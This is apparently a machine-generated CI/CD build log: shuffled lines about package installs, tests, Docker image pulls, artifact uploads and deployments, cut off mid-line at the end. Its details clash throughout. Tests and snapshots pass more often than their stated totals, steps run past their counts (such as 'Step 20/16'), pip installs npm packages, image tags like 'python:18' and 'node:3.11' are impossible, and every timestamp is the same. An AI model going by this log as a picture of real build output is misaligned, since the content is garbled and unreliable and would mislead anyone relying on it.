'hotfix/task-487'\nCache restored successfully (45MB)\nBundling runtime.css\nBundling runtime.js\nCoverage: 94% statements, 63% branches\npip: Collecting prettier\nnpm notice: created a lockfile\nBundling runtime.css\n\u2713 Step 'setup' succeeded\n[12:19:05] INFO: Connecting to database\nConnecting to acme.corp:443...\nStep 9/17: Running migrations\n\u2713 deploy completed\n[12:19:05] INFO: Cache refreshed\n[12:19:05] DEBUG: Initializing service\nGenerating source maps...\nCompiling utils/app.ts...\n\u2717 build failed with exit code 25\nStep 13/22: Testing\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\nCreating production build...\npip: Collecting express\nNODE_ENV=production\nUsing Node.js 19.1.6\nSnapshots: 14 passed, 0 total\n\u2713 Task completed in 3798ms\nCache miss for key-7362\npip: Downloading axios-1.0.tar.gz\nCompiling utils/index.js...\nTime: 102.985s\nCompiling src/utils.go...\nVerifying...\nCoverage: 89% statements, 72% branches\nStep 16/24: Deploying\nGET /status - 201 (42ms)\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] INFO: Processing request\nOptimizing 28 modules...\n[12:19:05] DEBUG: Loading configuration\nProcessing...\nTime: 73.934s\nCache invalidated: build\nTests: 419 passed, 151 total\nnpm install: added 487 packages\nNODE_ENV=development\n[12:19:05] INFO: Cache refreshed\nCompleted.\nGenerating source maps...\nCompiling src/index.js...\nCache restored successfully (129MB)\n[12:19:05] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nCompiling lib/service.java...\nPOST /api - 202 (67ms)\nStep 11/24: Deploying\nCoverage: 86% statements, 89% branches\nyarn add: Done in 7.52s\nnpm notice: created a lockfile\nCompiling lib/main.py...\n[12:19:05] DEBUG: Query executed in 68ms\nCompiling utils/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'build' (5 files)\nTests: 91 passed, 492 total\nRan 176 tests in 17s\nnpm notice: package.json updated\nCompiling components/service.java...\nStep 5/22: Testing\nRan 21 tests in 38s\nCache restored successfully (469MB)\nUploading artifact 'coverage' (23 files)\n[12:19:05] DEBUG: Query executed in 55ms\n[12:19:05] INFO: Request completed\nSwitched to branch 'bugfix/task-934'\nBuilding Docker image...\nPOST /upload - 201 (53ms)\npip: Installing build dependencies...\n[12:19:05] DEBUG: Initializing service\nStep 10/17: Installing dependencies\nGET /health - 204 (54ms)\nFetching submodules...\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 358 packages\nOK\nUploading artifact 'coverage' (32 files)\nnpm notice: created a lockfile\n  PASS: integration/test_cache_hit.spec.js\nStep 12/25: Testing\nOptimizing 77 modules...\nTransforming 538 files...\n\u2713 package completed\n[12:19:05] ERROR: Connection failed\nWARNING: jest has known vulnerabilities\npip: Installing build dependencies...\nTests: 139 passed, 79 total\npip: Collecting axios\nImage pulled successfully\nLayer 6/9: RUN command\nUploading artifact 'dist' (23 files)\n[12:19:05] DEBUG: Memory usage: 342MB\nFAILED: test_api_health\nPulling image: python:18\n[12:19:05] DEBUG: Connection pool: 4 active\nException: ValueError\nPulling image: python:3.11\nSuccess!\nWARNING: webpack has known vulnerabilities\nPlatform: darwin-arm64\nCache invalidated: dependencies\nCache invalidated: build\nWARNING: axios has known vulnerabilities\n[12:19:05] WARN: Deprecated API usage\npip: Installing build dependencies...\nBundling main.js\n\u2713 Task completed in 4297ms\nRan 111 tests in 25s\npip: Downloading eslint-5.18.tar.gz\nFetching submodules...\nChecking out main branch\nLoading...\nRan 151 tests in 11s\nEnvironment: staging\nChecking out main branch\nConnection established\n\u2713 Task completed in 1759ms\nSnapshots: 7 passed, 32 total\nImage pulled successfully\nGenerating source maps...\nCompleted.\nUsing Python 3.12\nImage pulled successfully\n\u2713 All checks passed\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'build' (2 files)\nLoading...\nnpm install: resolved 1464 packages\nFetching submodules...\nTest Suites: 32 passed, 33 total\nnpm notice: package.json updated\nEnvironment: production\nTest Suites: 13 passed, 39 total\n  PASS: integration/test_db_connect.spec.js\nUploading artifact 'dist' (7 files)\nnpm install: added 266 packages\n\u2717 build failed with exit code 30\n[12:19:05] WARN: Deprecated API usage\nDone.\nCreating production build...\nCoverage: 78% statements, 100% branches\nVerifying...\nSuccess!\n[12:19:05] INFO: Starting build process\nPushing to registry...\nRan 53 tests in 4s\nAlready up to date.\nImage pulled successfully\nFAILED: test_user_create\nConnecting to example.com:443...\n[12:19:05] INFO: Connecting to database\nFetching submodules...\n\u2713 All checks passed\nPulling image: node:3.11\nCompiling src/handler.rs...\nStep 3/21: Deploying\nyarn add: Done in 15.43s\n  PASS: unit/test_db_connect.spec.js\n[12:19:05] DEBUG: Query executed in 52ms\nnpm notice: created a lockfile\nHEAD is now at 39df5af\nCreating production build...\n\u2713 All checks passed\n[12:19:05] DEBUG: Initializing service\nTLS handshake completed\nDone.\nStep 6/15: Linting\nCreating production build...\nFinished.\npip: Collecting lodash\nReady.\nPushing to registry...\n=== Step unit_tests completed ===\n=== Step: integration_tests ===\n[12:19:05] DEBUG: Connection pool: 7 active\n[12:19:05] WARN: Deprecated API usage\nStep 19/25: Linting\nCompiling components/app.ts...\n[12:19:05] DEBUG: Loading configuration\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 53\nnpm install: resolved 685 packages\nInstalling eslint@5.9.5\nConnecting to cloud.services:443...\n[12:19:05] DEBUG: Loading configuration\nConnecting to acme.corp:443...\nChecking out develop branch\nOptimizing 12 modules...\n[12:19:05] WARN: Deprecated API usage\nVerifying...\nLayer 2/8: ENV command\nArtifact uploaded: dist.zip (5MB)\nMinifying main.js\npip: Collecting eslint\nStep 3/24: Installing dependencies\n[12:19:05] DEBUG: Query executed in 96ms\n\u2717 build failed with exit code 4\nRan 46 tests in 42s\nBundling vendor.js\nTransforming 322 files...\nLayer 5/10: RUN command\npip install: Successfully installed eslint-2.8\nUsing Node.js 14.12.6\nBuilding Docker image...\nCache saved successfully\n[12:19:05] WARN: Deprecated API usage\nVerifying...\nStep 10/22: Installing dependencies\nChecking out master branch\nCompiling src/utils.go...\nOK\nCache saved successfully\nWARNING: react has known vulnerabilities\nTest Suites: 7 passed, 29 total\nTest Suites: 5 passed, 25 total\nUploading artifact 'dist' (35 files)\nStep 19/17: Installing dependencies\n\u2717 build failed with exit code 45\nWaiting...\nUploading artifact 'coverage' (47 files)\nRan 166 tests in 41s\nStep 15/19: Deploying\nStep 11/17: Linting\nStep 10/24: Installing dependencies\nStep 13/22: Installing dependencies\nConnection established\nUsing Python 3.9\nStep 20/22: Testing\nyarn add: Done in 30.57s\nWARNING: webpack has known vulnerabilities\nWARNING: express has known vulnerabilities\npip: Downloading express-5.19.tar.gz\nProcessing...\nCompleted.\nAlready up to date.\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 15 passed, 39 total\nStep 16/21: Installing dependencies\nNODE_ENV=test\nImage pulled successfully\nCompleted.\nWARNING: axios has known vulnerabilities\n[12:19:05] DEBUG: Initializing service\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nEnvironment: development\nGET /api - 201 (18ms)\nCompiling src/index.js...\nReady.\nWARNING: eslint has known vulnerabilities\nBundling vendor.css\nUploading artifact 'dist' (29 files)\nStep 14/17: Testing\nPlatform: linux-x64\nReady.\nRan 163 tests in 35s\nyarn add: Done in 29.46s\nNODE_ENV=test\nAlready up to date.\nNODE_ENV=production\nCompiling components/utils.go...\npip: Installing build dependencies...\nPOST /data - 202 (37ms)\nBuilding Docker image...\n\u2713 Task completed in 4163ms\nConnection established\n  PASS: e2e/test_api_health.spec.js\nException: RuntimeError\n[12:19:05] DEBUG: Memory usage: 952MB\nnpm notice: created a lockfile\nUsing Node.js 20.20.10\nConnection established\nCache hit for key-7235\n[12:19:05] INFO: Starting build process\nCache restored successfully (120MB)\n\u2713 Task completed in 887ms\nTransforming 155 files...\nSuccess!\n\u2713 All checks passed\n[12:19:05] INFO: Starting build process\nChecking out develop branch\npip: Collecting lodash\nyarn add: Done in 1.13s\nUsing Python 3.12\nNODE_ENV=production\nVerifying...\nProcessing...\nPlatform: linux-x64\n[12:19:05] INFO: Processing request\nBundling vendor.css\n  PASS: integration/test_user_create.spec.js\nStep 2/16: Deploying\nProcessing...\nnpm install: resolved 329 packages\nLoading...\nPOST /upload - 201 (447ms)\n[12:19:05] WARN: Deprecated API usage\npip install: Successfully installed react-4.12\nConnection established\n\u2713 Step 'install' succeeded\nCache hit for key-2843\n[12:19:05] INFO: Starting build process\nCreating production build...\nArtifact uploaded: build.tar.gz (22MB)\nGenerating source maps...\nFinished.\npip: Installing build dependencies...\nConnection established\nnpm notice: created a lockfile\n  PASS: test_auth_login (351ms)\n[12:19:05] DEBUG: Loading configuration\n\u2713 Task completed in 2655ms\n[12:19:05] DEBUG: Query executed in 84ms\nOK\n  PASS: test_cache_hit (187ms)\nnpm notice: package.json updated\nCompiling lib/main.py...\nCache restored successfully (317MB)\nMinifying main.js\nStep 10/24: Linting\nCompiling components/handler.rs...\n\u2713 Task completed in 798ms\nConnecting to startup.dev:443...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 113 packages\nGET /health - 204 (60ms)\nAlready up to date.\nUsing Python 3.11\nArtifact uploaded: build.tar.gz (10MB)\nOptimizing 73 modules...\nNODE_ENV=test\nArtifact uploaded: dist.zip (8MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\n[12:19:05] DEBUG: Loading configuration\nArtifact downloaded: 44MB\nStep 15/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLayer 10/11: RUN command\nHEAD is now at 56aefef\nConnecting to acme.corp:443...\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 53b5101\nEnvironment: production\nWaiting...\nStep 13/21: Deploying\nCompleted.\nBuilding Docker image...\nDone.\nTime: 110.910s\nTransforming 396 files...\nFetching submodules...\nTransforming 622 files...\npip install: Successfully installed jest-3.20\n[12:19:05] DEBUG: Loading configuration\nnpm install: added 91 packages\n[12:19:05] DEBUG: Initializing service\n[12:19:05] WARN: Deprecated API usage\nCompiling utils/service.java...\nWaiting...\nPlatform: linux-x64\nyarn add: Done in 23.79s\nGET /status - 200 (42ms)\nWARNING: react has known vulnerabilities\nUsing Node.js 14.4.9\nRan 11 tests in 16s\nVerifying...\n[12:19:05] DEBUG: Query executed in 73ms\n\u2713 Step 'checkout' succeeded\nCompiling src/handler.rs...\npip: Downloading prettier-1.14.tar.gz\nnpm notice: created a lockfile\nTest Suites: 28 passed, 6 total\nUsing Python 3.9\nWARNING: prettier has known vulnerabilities\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\nLayer 3/11: COPY command\nAlready up to date.\nUsing Node.js 17.19.9\nPushing to registry...\nStep 14/21: Testing\nProcessing...\n[12:19:05] DEBUG: Initializing service\nCompiling components/index.js...\n\u2713 package completed\npip: Collecting lodash\nPulling image: node:latest\nImage pulled successfully\nStep 16/23: Building\n[12:19:05] DEBUG: Query executed in 2ms\nProcessing...\nnpm install: added 369 packages\nUsing Python 3.12\npip install: Successfully installed prettier-4.15\nPlatform: win32-x64\nTests: 308 passed, 500 total\nChecking out master branch\n[12:19:05] WARN: Deprecated API usage\nMinifying main.js\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] DEBUG: Connection pool: 20 active\n[12:19:05] INFO: Connecting to database\npip: Installing build dependencies...\n[12:19:05] WARN: Deprecated API usage\nSnapshots: 40 passed, 31 total\n[12:19:05] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (23MB)\n[12:19:05] WARN: Deprecated API usage\nStep 15/22: Running migrations\nSnapshots: 5 passed, 50 total\nFAILED: test_auth_login\nWARNING: prettier has known vulnerabilities\nCompiling components/app.ts...\nCache restored successfully (179MB)\nCreating production build...\nCompiling utils/app.ts...\nUsing Python 3.9\nInstalling axios@5.11.8\nTLS handshake completed\nImage pulled successfully\nStep 7/22: Building\nWaiting...\nCompiling src/service.java...\nPlatform: darwin-arm64\n\u2713 All checks passed\nBundling styles.js\nTime: 71.657s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed express-3.17\nSwitched to branch 'bugfix/task-531'\nImage pulled successfully\nMinifying main.js\nWARNING: lodash has known vulnerabilities\n[12:19:05] DEBUG: Connection pool: 9 active\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-785'\nStep 20/16: Testing\nArtifact downloaded: 47MB\nSwitched to branch 'hotfix/task-196'\n\u2713 Task completed in 2064ms\nPlatform: win32-x64\nSuccess!\nCompiling utils/index.js...\nOptimizing 22 modules...\nCache invalidated: dependencies\n[12:19:05] WARN: Deprecated API usage\nOptimizing 14 modules...\n[12:19:05] INFO: Processing request\nWARNING: jest has known vulnerabilities\nPlatform: darwin-arm64\n\u2713 All checks passed\nCompiling utils/utils.go...\n[12:19:05] DEBUG: Loading configuration\npip: Downloading express-5.3.tar.gz\nFetching submodules...\nFetching submodules...\npip install: Successfully installed express-2.3\nStep 2/20: Running migrations\nLayer 1/13: COPY command\npip: Collecting axios\nVerifying...\n\u2713 All checks passed\nEnvironment: staging\nTest Suites: 24 passed, 36 total\nSnapshots: 34 passed, 18 total\nnpm install: resolved 1421 packages\nTransforming 501 files...\nStep 20/18: Installing dependencies\nCoverage: 74% statements, 70% branches\nReady.\nCreating production build...\nTLS handshake completed\nyarn add: Done in 1.6s\nPushing to registry...\nArtifact uploaded: build.tar.gz (3MB)\nPOST /data - 201 (240ms)\npip: Collecting prettier\npip: Downloading jest-2.5.tar.gz\n\u2713 Step 'install' succeeded\nLoading...\nGET /status - 200 (59ms)\nStep 17/17: Linting\nEnvironment: staging\n\u2713 build completed\nWaiting...\nCache hit for key-4581\nLoading...\n[12:19:05] INFO: Request completed\n\u2713 Task completed in 613ms\n  PASS: unit/test_user_create.spec.js\nTransforming 136 files...\nOptimizing 35 modules...\nStep 1/25: Building\n[12:19:05] INFO: Processing request\nPulling image: node:18\nNODE_ENV=test\nStep 20/15: Testing\npip install: Successfully installed express-4.15\nCompiling components/app.ts...\nStep 17/15: Deploying\nCompiling src/utils.go...\n  PASS: integration/test_db_connect.spec.js\nPulling image: node:3.11\nReady.\nStep 17/18: Running migrations\nCompiling utils/main.py...\nLayer 1/12: COPY command\nCache saved successfully\nChecking out develop branch\nPushing to registry...\nTests: 341 passed, 109 total\nArtifact downloaded: 25MB\nCache hit for key-1891\nnpm notice: package.json updated\nInstalling axios@3.15.9\nProcessing...\n[12:19:05] INFO: Cache refreshed\nInstalling react@4.12.2\n  PASS: e2e/test_cache_hit.spec.js\nnpm notice: created a lockfile\nVerifying...\nArtifact uploaded: dist.zip (20MB)\nPlatform: win32-x64\nSuccess!\nCoverage: 89% statements, 65% branches\nFinished.\nPlatform: darwin-arm64\nConnecting to example.com:443...\n[12:19:05] INFO: Processing request\nImage pulled successfully\nVerifying...\nCompleted.\nSuccess!\nFinished.\nPOST /api - 200 (34ms)\nVerifying...\nWARNING: eslint has known vulnerabilities\nyarn add: Done in 14.17s\nCache restored successfully (76MB)\nWARNING: axios has known vulnerabilities\n[12:19:05] INFO: Cache refreshed\n[12:19:05] DEBUG: Query executed in 48ms\n[12:19:05] WARN: Deprecated API usage\nEnvironment: development\nCache restored successfully (376MB)\nTransforming 726 files...\nTime: 79.492s\nImage pulled successfully\nStep 13/16: Deploying\nCache saved successfully\n[12:19:05] DEBUG: Query executed in 98ms\nStep 17/24: Deploying\nStep 20/19: Running migrations\nCache saved successfully\nHEAD is now at 65039cd\nAlready up to date.\n[12:19:05] INFO: Processing request\nFetching submodules...\n[12:19:05] WARN: Deprecated API usage\nCache restored successfully (394MB)\nRan 98 tests in 39s\nReady.\nCache miss for key-9289\nOK\nBundling main.js\nUploading artifact 'build' (37 files)\nLayer 3/8: RUN command\n\u2713 Step 'build' succeeded\nUsing Python 3.9\nWARNING: eslint has known vulnerabilities\nCache restored successfully (196MB)\nStep 15/24: Installing dependencies\nLayer 1/10: COPY command\nSwitched to branch 'bugfix/task-660'\n[12:19:05] DEBUG: Initializing service\nMinifying vendor.js\nSuccess!\nConnecting to cloud.services:443...\nPushing to registry...\nnpm install: resolved 1033 packages\n=== Step upload_artifacts completed ===\n=== Step: e2e_tests ===\nChecking out develop branch\n\u2713 All checks passed\nTest Suites: 30 passed, 43 total\nGenerating source maps...\nnpm notice: created a lockfile\nOK\nException: NullPointerException\nRan 98 tests in 50s\nTLS handshake completed\nPushing to registry...\nOptimizing 47 modules...\nOptimizing 53 modules...\nConnecting to test.io:443...\nTransforming 359 files...\n[12:19:05] DEBUG: Initializing service\nPOST /upload - 201 (234ms)\nWARNING: jest has known vulnerabilities\nTime: 36.273s\nArtifact uploaded: dist.zip (91MB)\n  PASS: integration/test_api_health.spec.js\nArtifact downloaded: 12MB\nBuilding Docker image...\npip install: Successfully installed webpack-2.4\npip: Downloading prettier-2.12.tar.gz\n[12:19:05] INFO: Cache refreshed\npip install: Successfully installed lodash-1.12\nStep 9/18: Linting\nCache invalidated: dependencies\n[12:19:05] DEBUG: Loading configuration\n[12:19:05] WARN: Deprecated API usage\nPlatform: darwin-arm64\nPOST /api - 202 (129ms)\nCompiling components/index.js...\npip: Installing build dependencies...\nUsing Node.js 15.5.7\nyarn add: Done in 26.45s\nStep 13/24: Deploying\nStep 19/23: Testing\nMinifying vendor.js\nInstalling axios@4.3.3\nTLS handshake completed\nRan 133 tests in 38s\nCompiling lib/app.ts...\n[12:19:05] INFO: Connecting to database\nCompiling utils/app.ts...\nyarn add: Done in 5.6s\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] WARN: Deprecated API usage\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\nSuccess!\nFinished.\n[12:19:05] INFO: Processing request\npip: Downloading eslint-2.18.tar.gz\nLayer 4/11: COPY command\n[12:19:05] INFO: Cache refreshed\nStep 11/15: Deploying\nConnecting to acme.corp:443...\nStep 3/24: Testing\n[12:19:05] DEBUG: Query executed in 50ms\nConnecting to startup.dev:443...\nStep 13/23: Building\nLoading...\nPOST /data - 200 (80ms)\nWARNING: express has known vulnerabilities\n[12:19:05] INFO: Cache refreshed\nPushing to registry...\nTime: 75.12s\nFAILED: test_auth_login\nCache saved successfully\nImage pulled successfully\nTime: 64.950s\nDone.\n  PASS: integration/test_user_create.spec.js\nAlready up to date.\nAlready up to date.\nUsing Python 3.11\nCache saved successfully\nCache miss for key-5583\nVerifying...\nnpm notice: created a lockfile\nUploading artifact 'dist' (9 files)\nChecking out main branch\n[12:19:05] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nPlatform: linux-x64\nConnecting to cloud.services:443...\nPushing to registry...\nSuccess!\nStep 10/20: Building\nStep 11/21: Installing dependencies\nBundling main.js\nBundling main.js\n\u2713 Task completed in 2550ms\n[12:19:05] DEBUG: Query executed in 3ms\nnpm install: resolved 286 packages\nPulling image: python:18\n\u2713 Task completed in 4857ms\nBuilding Docker image...\nFinished.\nUsing Node.js 14.4.4\nStep 3/23: Deploying\n[12:19:05] DEBUG: Loading configuration\nMinifying vendor.js\n[12:19:05] INFO: Processing request\nCache saved successfully\n\u2717 build failed with exit code 124\nGenerating source maps...\nOptimizing 100 modules...\nyarn add: Done in 6.51s\nProcessing...\nGenerating source maps...\nTime: 95.448s\nConnecting to test.io:443...\nCompleted.\nnpm notice: package.json updated\nUsing Python 3.12\nWaiting...\nWaiting...\nTransforming 459 files...\nTransforming 987 files...\n[12:19:05] INFO: Processing request\nCache hit for key-3426\npip: Installing build dependencies...\n[12:19:05] WARN: Deprecated API usage\nSuccess!\nPulling image: python:18\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'feature/task-518'\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 178 tests in 10s\nLoading...\nFAILED: test_auth_login\nArtifact uploaded: dist.zip (92MB)\nWaiting...\nStep 6/21: Linting\nUsing Node.js 18.6.9\nCoverage: 91% statements, 87% branches\nStep 16/20: Linting\nCompiling src/index.js...\n\u2713 Task completed in 1669ms\nCompiling src/app.ts...\n[12:19:05] DEBUG: Connection pool: 1 active\nCreating production build...\nCompiling utils/handler.rs...\nCompiling src/service.java...\nImage pulled successfully\nOptimizing 62 modules...\n[12:19:05] INFO: Connecting to database\nStep 3/20: Installing dependencies\nVerifying...\nTime: 52.846s\nCache miss for key-2779\nEnvironment: production\nnpm notice: package.json updated\nInstalling lodash@1.1.10\n[12:19:05] DEBUG: Connection pool: 16 active\nSnapshots: 10 passed, 15 total\nStep 6/15: Linting\nDone.\n[12:19:05] INFO: Request completed\nRan 100 tests in 31s\nArtifact downloaded: 27MB\nTime: 51.680s\nImage pulled successfully\nCoverage: 77% statements, 74% branches\nStep 2/20: Running migrations\nyarn add: Done in 11.14s\nConnection established\nTransforming 424 files...\nGET /health - 204 (68ms)\nPushing to registry...\n[12:19:05] DEBUG: Query executed in 43ms\nMinifying vendor.js\nPulling image: alpine:latest\nStep 8/25: Building\n[12:19:05] INFO: Starting build process\nUsing Node.js 15.1.6\nFetching submodules...\nProcessing...\n\u2713 package completed\nTransforming 927 files...\n[12:19:05] DEBUG: Initializing service\nDone.\nPulling image: node:3.11\nWaiting...\nyarn add: Done in 12.90s\nPOST /upload - 200 (170ms)\nLayer 6/14: ENV command\nPushing to registry...\nProcessing...\nHEAD is now at 75e3152\nArtifact downloaded: 13MB\n[12:19:05] DEBUG: Loading configuration\n\u2713 Task completed in 2249ms\nPushing to registry...\nyarn add: Done in 25.56s\nEnvironment: development\n\u2713 Step 'install' succeeded\nStep 3/16: Running migrations\n[12:19:05] WARN: Deprecated API usage\nGenerating source maps...\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nGET /api - 204 (16ms)\n[12:19:05] DEBUG: Initializing service\nPulling image: node:latest\nCompleted.\nTests: 51 passed, 411 total\nWARNING: jest has known vulnerabilities\n\u2713 Task completed in 958ms\nCompiling src/main.py...\nArtifact uploaded: dist.zip (45MB)\nStep 2/24: Installing dependencies\npip install: Successfully installed react-3.9\nCompiling utils/app.ts...\n[12:19:05] INFO: Request completed\nnpm install: added 404 packages\nyarn add: Done in 19.6s\n[12:19:05] DEBUG: Connection pool: 3 active\n[12:19:05] ERROR: Connection failed\nGET /health - 200 (31ms)\nUsing Python 3.9\nArtifact uploaded: build.tar.gz (42MB)\nLoading...\n[12:19:05] INFO: Cache refreshed\n[12:19:05] DEBUG: Memory usage: 1153MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/15: Testing\nStep 15/22: Running migrations\nTransforming 511 files...\nTests: 481 passed, 155 total\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nVerifying...\n[12:19:05] INFO: Processing request\n[12:19:05] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:05] INFO: Processing request\nOK\nWARNING: jest has known vulnerabilities\nDone.\nStep 4/19: Linting\nSwitched to branch 'bugfix/task-613'\nGET /health - 201 (45ms)\nDone.\nnpm notice: package.json updated\nFetching submodules...\nArtifact uploaded: build.tar.gz (6MB)\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] DEBUG: Memory usage: 1791MB\n[12:19:05] INFO: Request completed\n\u2713 build completed\nCache restored successfully (311MB)\nSuccess!\nFinished.\nRan 19 tests in 37s\nWARNING: express has known vulnerabilities\nReady.\nnpm install: added 485 packages\n[12:19:05] DEBUG: Loading configuration\n\u2717 build failed with exit code 47\nPushing to registry...\npip: Downloading lodash-3.9.tar.gz\nArtifact uploaded: dist.zip (76MB)\n[12:19:05] DEBUG: Loading configuration\nCache miss for key-7772\nGenerating source maps...\nGenerating source maps...\nStep 5/18: Building\n[12:19:05] DEBUG: Memory usage: 766MB\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:05] DEBUG: Loading configuration\nNODE_ENV=production\nnpm install: resolved 980 packages\nStep 12/15: Installing dependencies\nBundling styles.css\nConnecting to cloud.services:443...\n[12:19:05] ERROR: Connection failed\nCompiling src/main.py...\nCompiling lib/utils.go...\nPOST /api - 201 (276ms)\nnpm install: resolved 680 packages\nConnection established\n[12:19:05] WARN: Deprecated API usage\nCreating production build...\nNODE_ENV=test\nGenerating source maps...\nFinished.\n  PASS: integration/test_auth_login.spec.js\nMinifying main.js\n[12:19:05] DEBUG: Connection pool: 5 active\nStep 11/25: Linting\n\u2713 deploy completed\n[12:19:05] DEBUG: Memory usage: 1511MB\n[12:19:05] DEBUG: Connection pool: 7 active\nTime: 67.812s\n[12:19:05] INFO: Starting build process\nFinished.\nPushing to registry...\n[12:19:05] INFO: Processing request\n[12:19:05] INFO: Request completed\n[12:19:05] DEBUG: Initializing service\nSuccess!\nyarn add: Done in 15.56s\nInstalling react@5.14.4\nFetching submodules...\nSwitched to branch 'hotfix/task-632'\n[12:19:05] DEBUG: Connection pool: 16 active\nArtifact uploaded: build.tar.gz (8MB)\nTransforming 486 files...\nStep 15/25: Running migrations\n[12:19:05] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-1317\nLayer 9/9: RUN command\n[12:19:05] INFO: Connecting to database\n\u2713 All checks passed\nWaiting...\nPulling image: alpine:latest\nDone.\npip install: Successfully installed axios-2.12\nCache invalidated: build\nCompiling src/handler.rs...\nOptimizing 79 modules...\nTime: 27.555s\nFinished.\nArtifact uploaded: dist.zip (70MB)\nTransforming 479 files...\nCompiling src/app.ts...\nnpm notice: package.json updated\nWARNING: react has known vulnerabilities\nWaiting...\nGET /status - 200 (29ms)\nVerifying...\nStep 12/22: Installing dependencies\n\u2713 Step 'checkout' succeeded\nProcessing...\nnpm install: resolved 1441 packages\nCache miss for key-4610\n[12:19:05] WARN: Deprecated API usage\nStep 3/25: Installing dependencies\nyarn add: Done in 13.35s\nUsing Python 3.11\nnpm install: resolved 620 packages\nEnvironment: test\n[12:19:05] DEBUG: Connection pool: 3 active\nnpm install: added 283 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:05] DEBUG: Connection pool: 11 active\nCache hit for key-9124\n  PASS: test_auth_login (51ms)\nBundling runtime.css\nTLS handshake completed\nWARNING: webpack has known vulnerabilities\nCompiling lib/main.py...\nTest Suites: 34 passed, 9 total\n\u2713 Task completed in 3111ms\nHEAD is now at 077e041\nArtifact downloaded: 26MB\nTime: 113.698s\nStep 7/16: Installing dependencies\npip: Collecting webpack\n[12:19:05] WARN: Deprecated API usage\nStep 17/23: Deploying\n[12:19:05] DEBUG: Connection pool: 13 active\nCompiling lib/utils.go...\n[12:19:05] DEBUG: Memory usage: 1794MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\nProcessing...\nMinifying main.js\nBuilding Docker image...\nOK\n\u2713 Step 'build' succeeded\nUploading artifact 'coverage' (26 files)\nPushing to registry...\n[12:19:05] INFO: Request completed\n[12:19:05] INFO: Processing request\nWaiting...\nFAILED: test_db_connect\nCache miss for key-7165\npip install: Successfully installed react-4.19\nWaiting...\nInstalling jest@1.14.2\nLoading...\nUsing Python 3.9\nConnection established\nStep 16/18: Installing dependencies\nBuilding Docker image...\n\u2713 All checks passed\nnpm notice: created a lockfile\nLoading...\n[12:19:05] ERROR: Connection failed\nWARNING: react has known vulnerabilities\nSnapshots: 1 passed, 47 total\nBuilding Docker image...\nnpm notice: package.json updated\nDone.\nReady.\nInstalling axios@1.2.3\nWARNING: prettier has known vulnerabilities\nStep 18/24: Running migrations\nWARNING: lodash has known vulnerabilities\n[12:19:05] INFO: Cache refreshed\npip: Collecting jest\n=== Step deploy_production completed ===\n=== Step: setup_node ===\nStep 6/23: Testing\nCache saved successfully\nBuilding Docker image...\nCache miss for key-7992\nnpm notice: created a lockfile\nChecking out main branch\nSuccess!\nWARNING: react has known vulnerabilities\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\nCompiling lib/handler.rs...\nCache invalidated: dependencies\n[12:19:05] DEBUG: Memory usage: 1678MB\n[12:19:05] ERROR: Connection failed\nCoverage: 97% statements, 85% branches\nyarn add: Done in 8.6s\nWARNING: webpack has known vulnerabilities\nFinished.\n\u2713 build completed\nBundling vendor.css\nAlready up to date.\nSnapshots: 9 passed, 44 total\nCache invalidated: dependencies\nCache invalidated: dependencies\nWaiting...\nGET /status - 204 (59ms)\nCoverage: 95% statements, 61% branches\n[12:19:05] DEBUG: Memory usage: 1866MB\n[12:19:05] ERROR: Connection failed\nCreating production build...\nEnvironment: staging\nCache invalidated: node_modules\n[12:19:05] INFO: Processing request\nFinished.\nPulling image: alpine:3.11\nCache miss for key-4699\nNODE_ENV=production\n[12:19:05] INFO: Request completed\nConnecting to cloud.services:443...\nCache miss for key-1040\nArtifact uploaded: dist.zip (55MB)\nnpm install: resolved 438 packages\nEnvironment: production\nCompiling lib/utils.go...\nyarn add: Done in 25.95s\nConnection established\nCoverage: 73% statements, 72% branches\n\u2713 build completed\n[12:19:05] DEBUG: Loading configuration\n\u2717 build failed with exit code 9\nOK\nCompiling components/index.js...\nGET /api - 200 (93ms)\nnpm install: resolved 987 packages\nCompleted.\npip: Collecting react\nCompiling components/utils.go...\nConnecting to startup.dev:443...\nStep 6/25: Testing\nEnvironment: production\nReady.\nCompiling src/utils.go...\n[12:19:05] DEBUG: Loading configuration\nMinifying main.js\nImage pulled successfully\nSnapshots: 33 passed, 36 total\n[12:19:05] ERROR: Connection failed\nStep 5/15: Linting\nCache saved successfully\nnpm install: added 247 packages\nMinifying vendor.js\n[12:19:05] INFO: Request completed\nStep 2/15: 